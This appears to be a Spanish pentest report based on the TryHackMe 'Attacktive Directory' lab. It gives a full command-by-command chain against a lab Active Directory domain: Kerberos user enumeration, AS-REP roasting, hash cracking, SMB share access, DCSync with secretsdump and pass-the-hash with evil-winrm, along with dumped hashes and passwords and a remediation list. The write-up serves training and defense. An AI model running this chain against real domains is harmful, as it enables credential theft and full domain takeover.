01 — Overview

Resumen Ejecutivo

Spookysec Ltd. contrató a Oriol Jaen Mirabet para realizar un pentest interno sobre el dominio SPOOKYSEC.LOCAL bajo un enfoque de caja negra, sin credenciales ni conocimiento previo del entorno. Las pruebas se realizaron el 7 de febrero de 2026.

Se identificaron 7 findings que representan un riesgo material para la confidencialidad, integridad y disponibilidad del entorno. Ningún finding se debió a CVEs o parches pendientes: todos son consecuencia de misconfiguraciones de Active Directory, gestión inadecuada de privilegios y contraseñas débiles.

El tester obtuvo acceso completo de Domain Administrator volcando el NTDS.dit completo mediante un ataque DCSync, comprometiendo los hashes NTLM de todos los usuarios del dominio incluyendo Administrator.

02 — Scope

Alcance y Metodología

Las pruebas cubrieron la red interna de Spookysec y el dominio Active Directory asociado. El enfoque fue no evasivo, buscando descubrir el mayor número posible de misconfigurations y vulnerabilidades.

  • 10.80.160.0/24 — Red interna Spookysec
  • spookysec.local — Dominio Active Directory
  • AttacktiveDirectory (10.80.160.X) — Domain Controller · Servicios: 53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985

Metodología: reconocimiento de red → enumeración de servicios → obtención de credenciales → acceso inicial → escalada de privilegios hasta Domain Admin.

03 — Attack Chain

Cadena de Compromiso

Paso 01 · Recon
Enumeración de usuarios Kerberos con kerbrute

Sin ninguna credencial, se realizó enumeración de usuarios válidos del dominio aprovechando la respuesta diferencial del KDC Kerberos ante usuarios válidos vs. inválidos. Se identificó la cuenta svc-admin como objetivo prioritario.

./kerbrute_linux_amd64 userenum --dc spookysec.local -d spookysec.local userlist.txt
```

[+] VALID USERNAME: james@spookysec.local
[+] VALID USERNAME: svc-admin@spookysec.local
[+] VALID USERNAME: robin@spookysec.local
[+] VALID USERNAME: backup@spookysec.local
[+] Done! Tested 73317 usernames (18 valid) in 312.539 seconds
```
Paso 02 · Exploitation
AS-REP Roasting — Obtención del hash de svc-admin

La cuenta svc-admin tenía el flag UF_DONT_REQUIRE_PREAUTH activo en Active Directory. Esto permite a cualquier atacante en la red solicitar un ticket AS-REP cifrado con la clave derivada de la contraseña del usuario, sin necesidad de autenticación previa.

python3 GetNPUsers.py spookysec.local/ -usersfile valid_users.txt -no-pass -dc-ip 10.10.181.132
```

[-] User james doesn’t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a62a1f7d5…
```
Paso 03 · Cracking
Cracking offline del hash AS-REP con hashcat

El hash AS-REP se crackeó offline usando hashcat en modo 18200 con la wordlist rockyou.txt. La contraseña management2005 se recuperó en cuestión de segundos, confirmando el uso de credenciales débiles en una cuenta de servicio con privilegios.

hashcat -m 18200 svc-admin.hash /usr/share/wordlists/rockyou.txt
```

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL::management2005
Status: Cracked
```
Paso 04 · Enumeration
Enumeración SMB y acceso al share "backup"

Con las credenciales de svc-admin se enumeraron los shares accesibles. El share backup estaba accesible y contenía el fichero backup_credentials.txt con credenciales codificadas en Base64.

smbclient -L //10.10.181.132 -U svc-admin%management2005
```

Sharename   Type   Comment
ADMIN$      Disk   Remote Admin
backup      Disk
C$          Disk   Default share

smbclient //10.10.181.132/backup -U svc-admin%management2005
smb: > ls
backup_credentials.txt   A   48
smb: > get backup_credentials.txt
```
Paso 05 · Credential Access
Decodificación de credenciales Base64

El fichero backup_credentials.txt contenía credenciales de la cuenta privilegiada backup codificadas en Base64 — sin ningún cifrado real. Un simple decode reveló las credenciales en texto claro.

$ cat backup_credentials.txt
```

YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

$ echo ‘YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw’ | base64 -d
backup@spookysec.local:backup2517860
```
Paso 06 · Domain Compromise
DCSync attack con secretsdump.py

La cuenta backup tenía permisos Replicating Directory Changes sobre el dominio, suficiente para simular el comportamiento de un DC y volcar todo el NTDS.dit via DRSUAPI. Se obtuvieron los hashes NTLM de todos los usuarios incluyendo el Domain Administrator.

python3 secretsdump.py -just-dc backup@10.10.181.132
```

Password: backup2517860

[*] Dumping Domain Credentials via DRSUAPI
Administrator:500:aad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404ee:0938c1580796561bc1d3161a2f76dcc2:::
svc-admin:1103:aad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
backup:1118:aad3b435b51404ee:19741bde08a5b52a566697e0c1e9a64c:::
```
Paso 07 · Full Compromise
Pass-the-Hash → Domain Admin shell (Evil-WinRM)

Con el hash NTLM del Administrator se autenticó directamente via Evil-WinRM sin necesitar la contraseña en texto claro. Técnica Pass-the-Hash — el dominio SPOOKYSEC.LOCAL quedó completamente comprometido.

evil-winrm -i 10.10.181.132 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
spookysec\administrator

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```

06 — Remediation

Resumen de Remediación

  • [Inmediata] Habilitar Kerberos pre-authentication en todas las cuentas — auditar con Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
  • [Inmediata] Resetear contraseñas de svc-admin y backup a passphrases aleatorias de 25+ caracteres
  • [Inmediata] Eliminar backup_credentials.txt del share — usar HashiCorp Vault o CyberArk para credenciales privilegiadas
  • [Inmediata] Reset completo de contraseñas de todos los usuarios del dominio; doble reset de krbtgt para invalidar tickets Kerberos
  • [Corto plazo] Desplegar Microsoft LAPS para passwords locales únicos en todos los endpoints
  • [Corto plazo] Auditar DCSync rights con BloodHound — eliminar Replicating Directory Changes de cuentas no-DC
  • [Corto plazo] Política de contraseñas: mínimo 12 caracteres + complejidad + auditoría con DSInternals
  • [Largo plazo] SIEM con alertas en Event ID 4768 (AS-REP sin pre-auth), 4662 (DCSync), 4625 (autenticación fallida)
  • [Largo plazo] Privileged Access Workstations (PAWs) para actividad administrativa
